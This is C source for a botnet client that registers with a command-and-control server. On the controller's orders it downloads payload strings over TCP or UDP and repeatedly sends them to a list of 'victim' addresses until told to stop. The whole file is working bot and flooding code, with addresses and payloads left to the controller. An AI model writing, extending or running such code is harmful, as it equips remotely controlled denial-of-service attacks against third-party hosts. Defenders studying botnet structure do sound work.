#include <stdio.h>
#include <string.h>
#include <err.h>
#include <sys/socket.h>
#include <netdb.h>
#include <stdlib.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <ctype.h>
#include <pthread.h>
#include <sys/time.h>
#include "netw.h"
#define MAX_PAYLOAD 1024
#define TIMEOUTMS 100000

char **payloads;
uint32_t npayloads;
struct sockaddr_in cnc_saddr;
socklen_t cnc_len;
int cnc_sock;
int stop;


typedef struct
{
	char addr[INET_ADDRSTRLEN];
	char port[22];
}
ippair;

typedef struct
{
	char command;
	ippair ippairs[22];
}
msg;

typedef struct
{
	int nvictims;
	int *vsocks;
}
chck_args;


void parse_payloads(char * payload_s)
{
	char *token;
	char *delimiter;
	int npayloads_old;

	npayloads_old = npayloads;	
	delimiter = ":";
	if (npayloads_old != 0)
	{
		for (int i = 0; i < npayloads_old; i++)
		{
			free(payloads[i]);
		}
		free(payloads);
	}

	token = strtok(payload_s, delimiter);

	npayloads = 0;
	while(token != NULL)
	{
		if (npayloads == 0) {
			payloads = malloc(sizeof(char *));
		}
		else 
		{
			payloads = realloc(payloads, sizeof(char *) * (npayloads + 1));
		}
		payloads[npayloads] = calloc(strlen(token) + 1, sizeof(char));
		strcpy(payloads[npayloads], token);
		token = strtok(NULL, delimiter);
        npayloads++;
		if(strncmp("\n",token, 1) == 0)
			break;
	}
}

void registration(int sock, const struct sockaddr_in to)
{
	char buf[] = "REG\n";
	sendtow(sock, buf, strlen(buf), 0, (const struct sockaddr *) &to, sizeof(to));
}

void hello_server_udp(int sock, const struct sockaddr_in to)
{
	char buf[] = "HELLO";
	sendtow(sock, buf, strlen(buf), 0, (const struct sockaddr *) &to, sizeof(to));
}

void hello_server_tcp(int sock)
{
	char buf[] = "HELLO";
	sendw(sock, buf, strlen(buf), 0);
}

void prog_udp(msg *message)
{
	struct sockaddr_in udp_saddr;
	socklen_t udp_len;
	ippair udppair;
	struct addrinfo *udp_res;
	int udp_sock;
	char *payload_s;

	payload_s = calloc(MAX_PAYLOAD, sizeof(char));
	udppair = message->ippairs[0];
	udp_res = resolveipandnport(udppair.addr, udppair.port, SOCK_DGRAM);

	memset(&udp_saddr, 0, sizeof(udp_saddr));
	udp_saddr.sin_family = udp_res->ai_family;
	udp_saddr.sin_port = ((struct sockaddr_in*) udp_res->ai_addr)->sin_port;
	udp_saddr.sin_addr = ((struct sockaddr_in*) udp_res->ai_addr)->sin_addr;

	udp_sock = socketw(udp_res->ai_family, udp_res->ai_socktype, udp_res->ai_protocol);
	hello_server_udp(udp_sock, udp_saddr);
	recvfromw(udp_sock, payload_s, MAX_PAYLOAD, 0, (struct sockaddr *) &udp_saddr, &udp_len);
	payload_s = payload_s + 8;
	parse_payloads(payload_s);
	close(udp_sock);
	return;
}

void prog_tcp(msg *message)
{
	int sockfd;
    struct addrinfo hints, *res;
    struct sockaddr_in serv_addr;
	char *payload_s;

	payload_s = calloc(MAX_PAYLOAD, sizeof(char));

	memset(&hints, 0, sizeof(hints));
    hints.ai_family = AF_INET;
    hints.ai_protocol = 0;
    hints.ai_socktype = SOCK_STREAM;
    hints.ai_flags |= AI_CANONNAME;

    getaddrinfow(message->ippairs->addr, message->ippairs->port, &hints, &res);
    sockfd = socketw(res->ai_family, res->ai_socktype, res->ai_protocol);
    serv_addr.sin_addr = ((struct sockaddr_in*) res->ai_addr)->sin_addr;
    serv_addr.sin_port = ((struct sockaddr_in*) res->ai_addr)->sin_port;
    serv_addr.sin_family = res->ai_family;

    connectw(sockfd, ((struct sockaddr*) &serv_addr), res->ai_addrlen);
	hello_server_tcp(sockfd);
	readw(sockfd, payload_s, MAX_PAYLOAD);
	payload_s = payload_s + 8;
	parse_payloads(payload_s);
	close(sockfd);
	return;
}

int check_socks(int nvictims, int *vsocks)
{
	fd_set master;
	int nfds;
	char buf[sizeof(msg)];
	msg *message;
	struct timeval tv = {1, 0};

	FD_ZERO(&master);

	for (int i = 0; i < nvictims; i++)
	{
		printf("SET %d\n", vsocks[i]);
		FD_SET(vsocks[i], &master);
	}

	for (int i = 0; i < nvictims; i++)
	{
		if(FD_ISSET(vsocks[i], &master)) {
			printf("ISSET %d\n", vsocks[i]);
		};
	}
	FD_SET(cnc_sock, &master);
	nfds = vsocks[nvictims-1] + 1;
	printf("Checking...\n");
	selectw(nfds, &master, NULL, NULL, &tv);
	for (int i = 0; i < nvictims; i++)
	{
		if(FD_ISSET(vsocks[i], &master)) {
			printf("VICTIM PACKET RECIEVED. STOP.\n");
			return 1;
		}
	}
	
	if(FD_ISSET(cnc_sock, &master)) {
		recvfromw(cnc_sock, buf, sizeof(buf), 0, (struct sockaddr *) &cnc_saddr, &cnc_len);
		message = (msg *) buf;
		if(message->command == '4') {
			printf("CNC COMMAND 4. STOP \n");
			return 1;
		}
	}
	return 0;
}

void run(msg* message1, size_t nbytes1)
{
	ippair udppair;
	int *vsocks;
	int nvictims = (nbytes1 - 1) / sizeof(ippair);
	struct sockaddr_in *victim_saddrs;
	socklen_t victimlen = sizeof(victim_saddrs[0]);
	const int on = 1;
	chck_args *sargs;

	victim_saddrs = calloc(nvictims, sizeof(struct sockaddr_in));
	vsocks = calloc(nvictims, sizeof(int));
	for (int i = 0; i < nvictims; i++)
	{   
		udppair = message1->ippairs[i];
		struct addrinfo *vctm_res;
		vctm_res = resolveipandnport(udppair.addr, udppair.port, SOCK_DGRAM);
		memset(&victim_saddrs[i], 0, sizeof(victim_saddrs[i]));
		victim_saddrs[i].sin_family = vctm_res->ai_family;
		victim_saddrs[i].sin_port = ((struct sockaddr_in*) vctm_res->ai_addr)->sin_port;
		victim_saddrs[i].sin_addr = ((struct sockaddr_in*) vctm_res->ai_addr)->sin_addr;
		vsocks[i] = socketw(vctm_res->ai_family, vctm_res->ai_socktype, vctm_res->ai_protocol);
		//setsockoptw(vsocks[i], SOL_SOCKET, SO_BROADCAST, &on, sizeof(on));
	}

	while(1)
	{
		
		for(int i = 0; i < npayloads; i++)
		{
			for(int j = 0; j < nvictims; j++)
			{
				printf("Sending payload %d to socket %d!\n", i, vsocks[j]);
				sendtow(vsocks[j], payloads[i], strlen(payloads[i]), 0, (const struct sockaddr *) &victim_saddrs[j], victimlen);
			}
		}
		if(check_socks(nvictims, vsocks)) {
			break;
		};
	}
	for (int i = 0; i < nvictims; i++)
	{
		close(vsocks[i]);
	}
	
}

int main(int argc, char *argv[])
{

	struct addrinfo *res;
	ssize_t nbytes;
	msg *message;
	char buf[sizeof(msg)];
	
	if (argc != 3)
	{
		err(1, "Usage:  ./bot server_ip server_port");
	}

	npayloads = 0;
	res = resolveipandnport(argv[1], argv[2], SOCK_DGRAM);
	memset(&cnc_saddr, 0, sizeof(cnc_saddr));
	cnc_saddr.sin_family = res->ai_family;
	cnc_saddr.sin_port = ((struct sockaddr_in*) res->ai_addr)->sin_port;
	cnc_saddr.sin_addr = ((struct sockaddr_in*) res->ai_addr)->sin_addr;

	cnc_sock = socketw(res->ai_family, res->ai_socktype, res->ai_protocol);
	registration(cnc_sock, cnc_saddr);

	cnc_len = sizeof(cnc_saddr);
	while (1)
	{
		nbytes = recvfromw(cnc_sock, buf, sizeof(buf), 0, (struct sockaddr *) &cnc_saddr, &cnc_len);
		message = (msg*) buf;
		switch (message->command)
		{
			case '0':
				{   
					close(cnc_sock);
					printf("QUIT command recieved. Exiting...\n");
					exit(0);
				}
			case '1':
				{
					prog_tcp(message);
					break;
				}
			case '2':
				{
					prog_udp(message);
					break;
				}
			case '3':
				{
					run(message, nbytes);
					break;
				}
			case '4':
				break;
			default:
				printf("Unknown command id received: %c\n", message->command);
		}
	}
}